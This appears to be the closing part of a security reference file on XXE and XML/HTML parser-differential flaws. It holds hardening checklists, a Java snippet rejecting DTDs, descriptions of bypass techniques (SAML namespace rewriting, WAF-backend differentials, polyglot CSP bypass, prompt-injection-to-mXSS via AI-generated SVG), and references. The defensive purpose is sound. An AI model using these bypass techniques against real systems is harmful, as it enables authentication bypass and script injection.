The single most impactful defense: configure every XML parser construction site to reject DOCTYPE declarations entirely. Per-runtime hardening (Java JAXP, Python lxml, .NET XmlReader, Nokogiri, libxmljs) is in §8's sink catalog. Centralize parser construction into a single hardened factory; never let application code construct XML parsers directly.

Audit checklist:

- [ ] Single hardened factory class wraps all XML-parser construction.
- [ ] Factory's hardening is unit-tested with an XXE payload that should be rejected.
- [ ] Linter / CI enforces that all `new XML*` constructions in the codebase go through the factory.
- [ ] Third-party libraries that perform XML parsing (Jackson-dataformat-xml, JAXB, dom4j, Apache POI, etc.) have their internal parsers configured via library-specific hooks.

### Schema-validate before parse

A second-order defense: stream the input through a validating tokenizer that rejects DOCTYPE / DTD constructs *before* the main parser sees them. StAX (Java's Streaming API for XML) supports this pattern:

```java
XMLInputFactory factory = XMLInputFactory.newInstance();
factory.setProperty(XMLInputFactory.SUPPORT_DTD, false);
factory.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, false);
XMLStreamReader reader = factory.createXMLStreamReader(input);
while (reader.hasNext()) {
  int eventType = reader.next();
  if (eventType == XMLStreamConstants.DTD) {
    throw new SecurityException("DTD detected; rejecting input");
  }
  // ...
}
```

Stream-validate-reject patterns work even for parsers downstream that can't be hardened (legacy code, third-party libraries).

### Canonical-form, then validate, then act

The discipline against parser-differential exploitation: pick *one* canonical XML representation, validate against it, and act on the same parsed form. Never:

- Parse with Parser A, validate against the AST of Parser A, then serialize and re-parse with Parser B for processing.
- Compute a signature against the canonicalized form produced by Library A, then process the document with Library B that walks the DOM differently.
- Trust that two XML parsers in the same dependency tree will produce identical DOMs.

The Somorovsky XSW lesson: even if both A and B are spec-conformant, the cone of *spec-acceptable* DOMs is large enough to fit attacker payloads. Reduce the cone: pin one parser, one walk, one canonicalization.

### Migrate off XML where feasible

XML's complexity is the bug surface. For many use cases — config files, internal APIs, structured logs — JSON, YAML, or TOML reduces the attack surface (no DTD, no entity machinery, no XInclude, no namespaces). The substitution is not free (JSON has its own parser-differential class; YAML has alias-loop and deserialization risks; TOML has fewer corners but is also less expressive), but the *XML-specific* attack surface goes to zero.

For substrates that *must* be XML (SAML, OOXML, SOAP, XMP/PDF metadata), accept that XML is unavoidable and apply rigorous parser hardening + canonicalization discipline.

### File-upload XXE specific defenses

For features that accept XML-shaped uploads (.docx, .svg, .pdf, .xfdf, .saml-response):

1. **Treat the upload as untrusted ZIP-of-untrusted-XML** for office formats. Unpack in a temp directory with restricted FS permissions; never let the unpack pipeline follow zip-slip-style relative paths into application directories.
2. **Render server-side images of SVGs**, don't serve them inline. Use ImageMagick, librsvg, or rsvg-convert with `--disable-extern-entities` (rsvg-convert) or `-define "svg:xml-parse-huge=false"` (ImageMagick). Strip XML metadata from PDFs before re-serving.
3. **Reject Content-Types you don't accept.** A user uploading a profile picture should not be able to upload `application/xml`. Validate MIME type AND magic-byte signature AND parse-once-to-confirm-shape (server-side, with hardened parser).
4. **Sandbox parser invocation.** Run the parsing step in a process or container with no network egress and minimal FS read access. Even a successful XXE then only reads what the sandbox exposes.

### Output side: never echo raw parsed content

A class of XXE exploitation depends on the application echoing parsed XML content back to the client (file contents leaked through the response body). Defense: serialize parsed content through a sanitizer or a typed model before echo. Never `Response.write(parsed.text)`.

### Code review checklist (per-PR)

For any PR that touches XML parsing, signature processing, file upload, or SAML/SSO:

1. [ ] Is a new XML parser constructed? If yes — does the construction include the hardening primitives for the runtime?
2. [ ] Is XML round-tripped (parse → serialize → parse)? If yes — through the same parser implementation?
3. [ ] Is the parsed content used to compute a signature or hash? If yes — is the canonicalization algorithm pinned and documented?
4. [ ] Is the parsed content echoed back to the client? If yes — is there a sanitization step in between?
5. [ ] Does the PR introduce a new XML-shaped file format (custom schema, new SOAP integration)? If yes — is parser hardening enforced at the new construction site?
6. [ ] Is the parser invocation isolated from the application's main process (sandbox, subprocess, container)?
7. [ ] Are XInclude features explicitly disabled?
8. [ ] Are external entities (general + parameter) explicitly disabled?
9. [ ] Are DOCTYPE declarations explicitly disabled?
10. [ ] Is the parser library's CVE history reviewed for the version pinned in dependencies?
11. [ ] For SAML/signed XML: is the signed-element XPath pinned and verified against the consumer's XPath?
12. [ ] For OOXML: is each of the ~25 internal parse points hardened, not just the main `document.xml`?
13. [ ] For file uploads: are sandboxes, MIME validation, and magic-byte checks in place?
14. [ ] For PDF: are XFDF, XMP, and AcroForm parser construction sites all hardened?
15. [ ] For HTML sanitization: is the sanitizer's parser the same one that will render the output? If not — is the round-trip differential gap measured and mitigated?

Cross-link to `code_review_expertise.md` for the broader candidate-point auditing discipline.

---

## 10. Variant analysis — under-explored substrates

### gRPC / protobuf parser-differentials

Protobuf is a binary format with no DTD-like extensibility, but parser-differentials still exist. Protobuf-js (Node.js), Go's `protobuf` (gogo and Google's official both), Java's `protobuf-java`, Python's `protobuf` all parse the same wire format but disagree on:

- Default-value handling for missing fields (proto2 vs proto3 semantics).
- Unknown-field preservation (some parsers drop them, some round-trip them).
- Repeated-field merge semantics on duplicate tag numbers.
- Varint length-encoding edge cases (some parsers accept "long-form" varints with leading zero bytes; some reject).

A protobuf-based authorization token that's signed by one implementation and verified by another may produce parser-differential bypass under crafted input. The CVE corpus is still thin; the structural surface is real.

### Apache Arrow / Parquet / ORC parser differentials in data pipelines

Data-engineering pipelines (Spark, Flink, Trino, DuckDB) consume Parquet and ORC files written by other implementations. Parser-differentials at the file-metadata layer have produced data-corruption and (rarely) RCE CVEs:

- Parquet's footer-metadata is itself a Thrift-encoded binary structure; multiple Thrift parsers disagree on edge cases.
- ORC's stripe-footer encodes column-statistic blobs; statistics-aware query planners may trust attacker-influenced statistics.

The CVE corpus is growing as data infrastructure moves into untrusted-input territory (multi-tenant data lakes, external-feed ingestion).

### WAF-vs-server parser-differentials

The HTTP-smuggling cousin: a WAF parses the request to apply security rules; the backend server parses the request to dispatch to the handler. If the two parsers disagree on header parsing, path canonicalization, or body framing, the attacker can construct a request that the WAF treats as benign but the backend treats as exploit-bearing. Orange Tsai's 2024 "Confusion Attacks: Exploiting Hidden Semantic Ambiguity in Apache HTTP Server" enumerated 20 such techniques in Apache.

The XML-specific subcase: a WAF that parses XML bodies to detect XXE patterns, applied to a backend that parses the same XML with a different parser. WAF sees `<root>safe</root>`; backend sees the same bytes with an attacker-controlled entity expansion. Defense: WAFs cannot reliably defend against XXE because they can't replicate every backend parser's behavior; rely on backend hardening.

### AI-tool output XML / HTML differentials

A new class emerging in 2024-2026: LLM-generated content (markdown, HTML, SVG, code) is consumed by downstream parsers that the LLM did not target. An LLM that emits SVG-like content for a chart may produce bytes that one SVG renderer normalizes to safe DOM and another renderer normalizes to script-bearing DOM. The mXSS class transposed into AI-content pipelines.

Cross-link to `llm_agent_security_expertise.md` for the broader AI-output-trust-boundary discipline.

### SVG-in-AI-generated-content

Image-generation models (Stable Diffusion XL, DALL-E variants, MidJourney) that support SVG output produce vector graphics that may contain `<foreignObject>`, embedded scripts (if not properly sandboxed in the model's output pipeline), or DTD references. Downstream consumers — chat clients, document editors, browsers — parse these SVGs with rendering pipelines that vary in mXSS-resistance.

The full chain: prompt injection → LLM emits SVG → consumer parses SVG → mXSS in consumer. Each step is a known class; the composition is novel.

### Cross-parser differentials in security scanners

Meta-class: security scanners themselves disagree on parsing. Semgrep, CodeQL, SonarQube, and Snyk Code each parse source code with their own ASTs. Source code that parses validly in one scanner but invalidly (or differently) in another creates a *scanner-bypass* primitive — an exploit that one scanner misses because the AST it computes differs from the one that the actual compiler computes.

This is the static-analysis-meta version of the parser-differential class. It's relevant to security-research practice: when authoring rules (the [Semgrep rule-writing docs](https://semgrep.dev/docs/writing-rules/overview)), be aware that the Semgrep AST is not identical to the compiler's AST, and that some real-world payloads exploit exactly that gap.

### Signature-bypass via XML namespace prefix rewriting

A subtle variant: XML namespaces can be declared with arbitrary prefix mappings. `<ns1:Element xmlns:ns1="http://example/foo">` and `<ns2:Element xmlns:ns2="http://example/foo">` are semantically identical; a canonicalization-aware signer treats them as the same. A *consumer* that walks DOM by literal prefix (`element.getElementsByTagName("ns1:Element")`) sees them as different.

Several pre-2015 SAML CVEs exploited exactly this: signer canonicalizes correctly; consumer walks by literal prefix; attacker introduces a namespace-rewritten element that survives the signature check but appears in the consumer's processing under a different prefix. The fix in modern SAML libraries: walk DOM by namespace URI + local name, never by literal prefix.

### Polyglot files (XML + JS + image)

A file that is *simultaneously* a valid SVG, JS file, and JPEG can be uploaded under any of three Content-Types and produce different behavior depending on how the consumer interprets it. PortSwigger's Heyes published canonical polyglot research (PolyglotJPG); the XML/SVG/JS triple is the modern instance. A CSP that allows `script-src 'self'` and an SVG that's also a JS file uploaded to the same origin = CSP-compliant XSS.

---

## 11. References

### Kurt Boberg's CVEs

- CVE-2022-39353 — @xmldom/xmldom multi-root: <https://github.com/advisories/GHSA-crh6-fp67-6883>
- CVE-2022-39353 NVD entry: <https://nvd.nist.gov/vuln/detail/CVE-2022-39353>
- CVE-2022-29546 — HtmlUnit NekoHtml processing-instruction OOM: <https://github.com/HtmlUnit/htmlunit-neko/security/advisories/GHSA-6jmm-mp6w-4rrg>
- CVE-2022-29546 NVD entry: <https://nvd.nist.gov/vuln/detail/CVE-2022-29546>
- CVE-2019-0228 — Apache PDFBox XFDF XXE: <https://issues.apache.org/jira/browse/PDFBOX-4505>
- CVE-2019-0228 oss-security disclosure: <https://www.openwall.com/lists/oss-security/2019/04/12/1>
- CVE-2019-0228 NVD entry: <https://nvd.nist.gov/vuln/detail/CVE-2019-0228>

### Foundational XXE references

- Timothy Morgan, "XML Schema, DTD, and Entity Attacks: A Compendium of Known Techniques" (2014): <https://research.nccgroup.com/wp-content/uploads/2014/05/xml_schema_dtd_and_entity_attacks-a_compendium_of_known_techniques.pdf>
- OWASP XML External Entity Prevention Cheat Sheet: <https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html>
- OWASP XML Security Cheat Sheet: <https://cheatsheetseries.owasp.org/cheatsheets/XML_Security_Cheat_Sheet.html>
- OWASP XXE community page: <https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing>
- PortSwigger Web Security Academy XXE: <https://portswigger.net/web-security/xxe>
- PortSwigger XXE via image file upload lab: <https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload>
- PortSwigger blind XXE with OOB via parameter entities: <https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction-using-parameter-entities>

### XML Signature Wrapping and SAML

- Somorovsky et al., "On Breaking SAML: Be Whoever You Want to Be" (USENIX Security 2012): <https://www.usenix.org/system/files/conference/usenixsecurity12/sec12-final91.pdf>
- USENIX Sec12 presentation page: <https://www.usenix.org/conference/usenixsecurity12/technical-sessions/presentation/somorovsky>
- Gareth Heyes, "The Fragile Lock: Novel Bypasses for SAML Authentication" (2024): <https://portswigger.net/research/the-fragile-lock>
- Hackmanit blog on XML Signature Validation Bypass: <https://hackmanit.de/en/blog-en/82-xml-signature-validation-bypass-in-simplesamlphp-and-xmlseclibs/>
- NCC Group "SAML XML Injection": <https://research.nccgroup.com/2021/03/29/saml-xml-injection/>

### Mutation XSS and HTML parser differentials

- Heiderich et al., "mXSS Attacks: Attacking Well-Secured Web-Applications by Using innerHTML Mutations" (ACM CCS 2013): <https://cure53.de/fp170.pdf>
- ACM Digital Library page: <https://dl.acm.org/doi/10.1145/2508859.2516723>
- Cure53 home: <https://cure53.de/>
- Bentkowski, "Write-up of DOMPurify 2.0.0 bypass using mutation XSS": <https://research.securitum.com/dompurify-bypass-using-mxss/>
- DOMPurify project: <https://github.com/cure53/DOMPurify>

### xmldom and Node.js XML parsers

- @xmldom/xmldom GitHub: <https://github.com/xmldom/xmldom>
- Snyk advisory database (xmldom): <https://security.snyk.io/package/npm/xmldom>
- Snyk @xmldom/xmldom vulnerabilities: <https://security.snyk.io/package/npm/@xmldom%2Fxmldom>

### Apache PDFBox

- PDFBox security advisories: <https://pdfbox.apache.org/security.html>
- PDFBOX-4505 issue: <https://issues.apache.org/jira/browse/PDFBOX-4505>

### URL parser differentials (sibling class)

- Daniel Stenberg, "The URL Interop Situation": <https://daniel.haxx.se/docs/URL-interop.html>
- Daniel Stenberg, "Don't mix URL parsers": <https://daniel.haxx.se/blog/2022/01/10/dont-mix-url-parsers/>
- Sonar, "Security Implications of URL Parsing Differentials": <https://www.sonarsource.com/blog/security-implications-of-url-parsing-differentials/>
- Claroty Team82, "Exploiting URL Parsing Confusion": <https://claroty.com/team82/research/exploiting-url-parsing-confusion>
- Snyk, "URL confusion vulnerabilities in the wild": <https://snyk.io/blog/url-confusion-vulnerabilities/>
- Orange Tsai, "A New Era of SSRF" (Black Hat 2017): <https://blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf>
- Orange Tsai, "Confusion Attacks: Exploiting Hidden Semantic Ambiguity in Apache HTTP Server!": <https://blog.orange.tw/posts/2024-08-confusion-attacks-en/>

### HTTP request smuggling (parser-differential sibling)

- James Kettle, "HTTP Desync Attacks: Request Smuggling Reborn": <https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn>
- James Kettle, "HTTP Desync Attacks: Smashing Into the Cell Next Door" (Black Hat 2019): <https://i.blackhat.com/USA-19/Wednesday/us-19-Kettle-HTTP-Desync-Attacks-Smashing-Into-The-Cell-Next-Door.pdf>

### JSON / YAML parser-differentials

- Microsoft, "An Industry-Wide Vulnerability in JSON Parsers" (2018) — see Bishop Fox writeup: <https://bishopfox.com/blog/json-interoperability-vulnerabilities>
- RFC 8785 JSON Canonicalization Scheme: <https://www.rfc-editor.org/rfc/rfc8785>
- YAML 1.1 vs 1.2 spec: <https://yaml.org/spec/>

### Snyk vulnerability database

- Snyk security DB: <https://security.snyk.io/>
- Snyk research blog: <https://snyk.io/blog/>

### Sibling expertise documents (cross-links)

- `deserialization_expertise.md` — Java/Python/PHP/.NET gadget chains; JSON-type-confusion class; YAML-deserialization-RCE; ObjectInputStream and reciprocal sinks.
- `code_review_expertise.md` — Candidate-point auditing methodology; click-count severity; trust-boundary audit pattern.
- [Semgrep rule-writing docs](https://semgrep.dev/docs/writing-rules/overview) — Rule authoring handbook; default-unsafe constructor pattern; negative property checks for hardening absence.
- `cryptography_expertise.md` — XML signature, canonicalization, signature wrapping context; broader signature trust-chain discipline.
- `prototype_pollution_expertise.md` — Sibling parser-confusion class in JavaScript; DOMPurify bypass corpus that overlaps with mXSS.
- `llm_agent_security_expertise.md` — AI-tool output trust boundaries; SVG-in-AI-content and downstream parser-differential exposure.

### Operational memory pointers

- `feedback_semgrep_rules_oss_gates` — CWE constraints; XXE rules typically tagged CWE-611 (Improper Restriction of XML External Entity Reference).
- `reference_key_artifacts` — Where to find rule corpus, expertise pointers, and prior XML/parser audit outputs.
